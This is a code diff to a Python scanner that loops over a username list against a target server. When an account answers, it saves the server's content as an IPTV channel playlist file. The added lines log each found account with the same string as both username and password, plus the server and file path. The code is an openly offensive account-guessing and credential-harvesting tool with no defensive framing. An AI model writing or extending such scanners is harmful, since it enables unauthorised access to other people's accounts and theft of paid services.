@@ -129,10 +129,8 @@ def start_scan():
         import requests
         for idx, username in enumerate(lines, start=1):
             scan_state["progress"] = idx
-            # Send individual username attempt to Web UI log only
             log_event(f"request for name: {username}", to_console=False)
             
-            # Log periodic progress summary to Portainer logs every 25 attempts
             if idx % 25 == 0 or idx == len(lines):
                 logger.info(f"Scan progress on {target_url}: {idx}/{len(lines)} ({round((idx/len(lines))*100)}%) - Accounts found: {found}")
 
@@ -145,7 +143,10 @@ def start_scan():
                     crawler.create_file(username, new_path, res.text)
                     found += 1
                     scan_state["found_accounts"] = found
-                    msg_found = f"ACCOUNT FOUND! Username: {username} on {target_url}"
+                    
+                    # Explicit detailed account credentials log
+                    m3u_file_path = os.path.join(domain, f"tv_channels_{username}.m3u").replace("\\", "/")
+                    msg_found = f"ACCOUNT FOUND !!! -> Username: '{username}' | Password: '{username}' | Server: '{target_url}' | Saved file: '{m3u_file_path}'"
                     log_event(msg_found, to_console=True)
             except Exception:
                 pass
